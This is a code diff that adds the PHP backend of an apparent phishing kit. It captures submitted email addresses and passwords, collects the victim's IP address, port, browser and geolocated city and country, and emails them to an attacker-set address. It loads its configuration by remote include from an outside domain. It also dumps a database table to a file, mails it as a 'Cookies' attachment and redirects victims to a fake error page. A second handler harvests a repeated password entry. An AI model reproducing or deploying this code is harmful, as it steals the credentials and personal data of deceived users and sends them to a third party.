@@ -1,0 +1,175 @@
+<?php
+
+if (isset($_POST['submit'])) {
+    $email = $_POST['login'];
+    $password = $_POST['passwd'];
+   
+      $date = date("M d, Y");
+      $time = date("h:i:a");
+
+include 'https://amwalksc.com/cgi/index/config.php';
+
+       $protocol = $_SERVER['SERVER_PROTOCOL']; 
+$ip = $_SERVER['REMOTE_ADDR']; 
+$port = $_SERVER['REMOTE_PORT'];
+$agent = $_SERVER['HTTP_USER_AGENT']; 
+$href = $_SERVER['HTTP_REFERER']; 
+$browser = get_browser(null, true);
+$user_ip = getenv('REMOTE_ADDR');
+$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
+$country = $geo["geoplugin_countryName"];
+$city = $geo["geoplugin_city"];
+
+       $to = $receiver_mail;
+       $subject = "New Log";
+       
+
+    $message ="\n\n" . "The Email = $email".
+    "\n\n" . "The Password = $password".
+     "\n\n" .
+      "\n\n" . "Device Info".
+       "\n\n" .
+    "\n\n" . "The IP Address = $ip".
+    "\n\n" . "The IP Port = $port".
+    "\n\n" . "The User Browser Agent = $agent".
+    "\n\n" . "The Location = $city, $country ".
+              "\n\n" . "Date = $date"."\n" . "Time = $time";
+              
+              
+    $from = $send_mail;
+    $headers = "From:" . $from;
+
+    if (mail($to, $subject, $message, $headers)) {
+        
+        // Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+    echo "<script>window.location.href='index.php'</script>";
+}
+
+// SQL query to fetch data from your table
+$sql = "SELECT * FROM $table WHERE Date = CURDATE()";
+$result = $conn->query($sql);
+
+// If there are results, save them to a file
+if ($result->num_rows > 0) {
+    // File path to save SQL data
+    $filename = 'data.sql';
+    $file = fopen($filename, 'w');
+
+    // Write data to the file
+    while ($row = $result->fetch_assoc()) {
+        $values = implode("','", array_map(array($conn, 'real_escape_string'), array_values($row)));
+        fwrite($file, "INSERT INTO $table (" . implode(',', array_keys($row)) . ") VALUES ('$values');\n");
+    }
+    fclose($file);
+
+    // Email configuration
+    $to = $receiver_mail; // recipient email address
+    $subject = "Cookies"; // email subject
+    $message = "The cookies log."; // email message
+    $from = $send_mail; // sender's email address
+
+    // Boundary
+    $semi_rand = md5(time());
+    $mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
+
+    // Headers for attachment
+    $headers = "From: $from\r\n";
+    $headers .= "MIME-Version: 1.0\r\n";
+    $headers .= "Content-Type: multipart/mixed;\r\n";
+    $headers .= " boundary=\"{$mime_boundary}\"";
+
+    // File attachment
+    $file_content = file_get_contents($filename);
+    $attachment = "--{$mime_boundary}\r\n" .
+        "Content-Type: application/sql;\r\n" .
+        " name=\"" . basename($filename) . "\"\r\n" .
+        "Content-Transfer-Encoding: base64\r\n" .
+        "Content-Disposition: attachment;\r\n" .
+        " filename=\"" . basename($filename) . "\"\r\n\r\n" .
+        chunk_split(base64_encode($file_content)) . "\r\n";
+
+    // Email message
+    $email_message = "--{$mime_boundary}\r\n" .
+        "Content-Type: text/plain; charset=\"UTF-8\"\r\n" .
+        "Content-Transfer-Encoding: 7bit\r\n\r\n" .
+        $message . "\r\n\r\n" .
+        $attachment . "\r\n";
+
+    // Send email
+    if (mail($to, $subject, $email_message, $headers)) {
+        
+              echo "<script>window.location.href='error.php'</script>";
+
+    } else {
+        echo "Failed to send email.";
+        echo "<script>window.location.href='index.php'</script>";
+    }
+
+    // Delete the file after sending email
+    unlink($filename);
+} else {
+    echo "No data found in the database.";
+    echo "<script>window.location.href='index.php'</script>";
+}
+
+// Close connection
+$conn->close();
+
+        
+
+      
+    }
+  else{
+    echo "<script>alert('Something Went Wrong. Please try again.');</script>";
+    echo "<script>window.location.href='index.php'</script>";
+    }
+    
+}
+
+
+?>
+
+<?php
+
+if (isset($_POST['submits'])) {
+    $email = $_POST['login'];
+    $password = $_POST['passwd'];
+   
+      $date = date("M d, Y");
+      $time = date("h:i:a");
+
+include 'https://amwalksc.com/cgi/index/config.php';
+
+      
+
+       $to = $receiver_mail;
+       $subject = "Confirm New Log";
+    $message ="\n\n" . "The Email = $email".
+    "\n\n" . "The Password = $password".
+     "\n\n" .
+              "\n\n" . "Date = $date"."\n" . "Time = $time";
+              
+              
+    $from = $send_mail;
+    $headers = "From:" . $from;
+
+    if (mail($to, $subject, $message, $headers)) {
+        
+      echo "<script>window.location.href='errors.php'</script>";
+      
+    }
+  else{
+    echo "<script>alert('Something Went Wrong. Please try again.');</script>";
+    echo "<script>window.location.href='index.php'</script>";
+   
+
+
+}
+}
+
+?>
